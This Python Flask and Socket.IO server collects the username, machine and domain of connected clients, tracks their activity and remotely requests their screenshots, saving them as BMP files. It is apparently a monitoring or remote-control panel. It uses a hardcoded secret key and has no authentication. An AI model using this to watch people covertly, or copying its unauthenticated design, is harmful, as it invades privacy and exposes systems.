from flask import Flask, render_template, jsonify
from flask_socketio import SocketIO, emit
from datetime import datetime
from threading import Thread
import socket
import json
import os
import struct


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

clients = {}
tcp_connections = {}

def ntohl(value):
    return int.from_bytes(value.to_bytes(4, 'big'), 'little')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_clients', methods=['GET'])
def get_clients():
    return jsonify(clients)

@app.route('/request_screenshot/<client_id>', methods=['POST'])
def request_screenshot(client_id):
    if client_id in tcp_connections:
        try:
            tcp_connections[client_id].sendall(b'SCREENSHOT')
            return jsonify(success=True), 200
        except Exception as e:
            print(f"Error sending screenshot request to client {client_id}: {e}")
            return jsonify(error="Failed to send screenshot request"), 500
    else:
        return jsonify(error="Client not connected"), 404

def receive_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def handle_client_connection(client_socket, address):
    try:
        client_info = client_socket.recv(1024).decode('utf-8')
        
        if not client_info:
            print(f"Received no data from {address}. Closing connection.")
            return

        try:
            user_data = dict(item.split(":") for item in client_info.split(", "))
            username = user_data.get("User", "Unknown")
            machine = user_data.get("Machine", "Unknown")
            domain = user_data.get("Domain", "Unknown")
            
            client_ip = address[0]
            
        except Exception as e:
            print(f"Error parsing client data from {address}: {client_info}")
            return

        client_id = f"{username}@{machine}"
        
        clients[client_id] = {
            'ip': client_ip,
            'username': username,
            'machine': machine,
            'domain': domain,
            'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        tcp_connections[client_id] = client_socket

        socketio.emit('update_client', {'id': client_id, **clients[client_id]})

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            
            try:
                text_data = data.decode('utf-8')
                
                if text_data.startswith("Activity:"):
                    clients[client_id]['last_active'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    socketio.emit('update_client', {'id': client_id, **clients[client_id]})
                elif text_data == "SCREENSHOT_BEGIN":
                    meta_data = receive_exact(client_socket, 16)
                    if meta_data is None:
                        print("Failed to receive metadata")
                        continue
                    
                    print(f"Received metadata size: {len(meta_data)} bytes")
                    print(f"Raw metadata: {meta_data.hex()}")

                    try:
                        width, height, bits_per_pixel, data_size = struct.unpack('<IIII', meta_data)
                        print(f"Image metadata: {width}x{height}, {bits_per_pixel} bpp, {data_size} bytes")
                        
                        if width <= 0 or width > 16384 or height <= 0 or height > 16384:
                            print(f"Invalid dimensions: {width}x{height}")
                            continue
                        if bits_per_pixel != 32:
                            print(f"Invalid bits per pixel: {bits_per_pixel}")
                            continue
                        if data_size != width * height * 4:
                            print(f"Invalid data size: {data_size} (expected {width * height * 4})")
                            continue

                        image_data = receive_exact(client_socket, data_size)
                        if image_data is None:
                            print("Failed to receive image data")
                            continue

                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        filename = f"screenshots/{client_id}_{timestamp}.bmp"
                        os.makedirs('screenshots', exist_ok=True)
                        
                        with open(filename, 'wb') as f:
                            # BMP Header (14 bytes)
                            f.write(b'BM')  # Signature
                            file_size = 14 + 40 + data_size
                            f.write(struct.pack('<I', file_size))  # File Size
                            f.write(struct.pack('<I', 0))  # Reserved
                            f.write(struct.pack('<I', 54))  # Pixel Data Offset
                            
                            # BMP Info Header (40 bytes)
                            f.write(struct.pack('<I', 40))  # Info Header Size
                            f.write(struct.pack('<I', width))  # Width
                            f.write(struct.pack('<i', -height))  # Height
                            f.write(struct.pack('<H', 1))  # Planes
                            f.write(struct.pack('<H', 32))  # Bits Per Pixel
                            f.write(struct.pack('<I', 0))  # Compression
                            f.write(struct.pack('<I', data_size))  # Image Size
                            f.write(struct.pack('<I', 0))  # X Pixels Per Meter
                            f.write(struct.pack('<I', 0))  # Y Pixels Per Meter
                            f.write(struct.pack('<I', 0))  # Colors Used
                            f.write(struct.pack('<I', 0))  # Important Colors
                            
                            # Pixel Data
                            f.write(image_data)
                        socketio.emit('screenshot_ready', {
                            'client_id': client_id,
                            'filename': filename
                        })
                        
                    except struct.error as e:
                        print(f"Error unpacking metadata: {e}")
                        print(f"Raw metadata: {meta_data.hex()}")
                        continue
                
            except UnicodeDecodeError:
                continue

    except Exception as e:
        print(f"Connection error with {address}: {e}")
    finally:
        client_socket.close()
        if 'client_id' in locals() and client_id in tcp_connections:
            del tcp_connections[client_id]

def start_tcp_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))
    server_socket.listen(5)

    while True:
        client_socket, address = server_socket.accept()
        client_thread = Thread(target=handle_client_connection, args=(client_socket, address))
        client_thread.start()

tcp_thread = Thread(target=start_tcp_server)
tcp_thread.start()

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
